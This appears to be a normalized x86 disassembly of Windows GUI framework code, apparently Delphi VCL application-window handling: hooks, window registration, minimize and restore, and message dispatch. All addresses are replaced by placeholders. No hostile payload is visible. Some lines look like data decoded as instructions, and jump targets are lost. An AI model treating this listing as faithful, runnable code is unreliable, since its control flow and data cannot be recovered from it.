call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45556c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_455680
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_4556dc
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45570c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_455734
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4556dc
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45570c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45570c
sub_455774
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a944
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_456e4c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42288c
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_422c5c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4575e4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c384
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_457044
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c3ac
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408644
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4042c0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_4577c0
mov eax ebx
call sub_4581d4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_455a7c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45595d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_4581e4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_456e4c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_457044
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4579e0
xor edx edx
mov eax esi
call sub_45735c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
push esi
push sub_455eb0
mov eax esi
call sub_456c38
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40568c
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403294
mov eax [ esi + 0x90 ]
call sub_403294
mov eax [ esi + 0x98 ]
call sub_403294
test bl bl
jle r-xdata
call sub_41ba6c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_455a7c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_455c1d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c24
lea eax [ ebp - 0x2c ]
call sub_404050
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_455ffc
call sub_41b9d4
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404510
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406a8c
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404050
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_456700
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_456700
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_455c2c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_454960
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_455c8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_414014
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43df6c
cmp ebx eax
je r-xdata
sub_455cfc
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_455c8c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_414170
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_455e14
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_414170
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_455eb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c64c
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_454e6c
mov eax [ rw-data ]
call sub_4554b4
sub_455f08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455f65
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f6c
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404248
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_455f74
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_455fb0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456700
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_455ffc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4566b6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455eb0
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45711c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_414170
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43df6c
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_458098
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_456c38
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_456bdc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_43df6c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456700
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_4554b4
push ebp
call sub_455f74
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_455f74
pop ecx
jmp [ eax * 4 + jump_table_4560a0 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_43df6c
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_456ab4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_442738
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_455f08
push ebp
call sub_455f74
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_455f74
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_455f74
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41a210
jmp r-xdata
xor eax eax
call sub_44de2c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_43df6c
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_438978
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45671c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_455f74
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4536b4
jmp r-xdata
push ebp
call sub_455f74
pop ecx
jmp r-xdata
push ebp
call sub_455fb0
pop ecx
jmp r-xdata
push ebp
call sub_455f74
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4567cc
jmp r-xdata
jmp r-xdata
call sub_42b480
call sub_42b560
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e04
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e14
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e0c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44dcdc
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_455f74
pop ecx
jmp r-xdata
call sub_44dd90
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_455f74
pop ecx
jmp r-xdata
call sub_42b480
call sub_42b5bc
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d268
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45671c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455e04
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_455734
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_43df6c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_43df6c
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_4567cc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_455734
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_43df6c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_455e14
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_43df6c
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_451440
mov eax [ ebx + 0x44 ]
call sub_45385c
sub_4568cc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_456908
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_4040a4
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404140
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_456954
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_456978
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4569c8
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
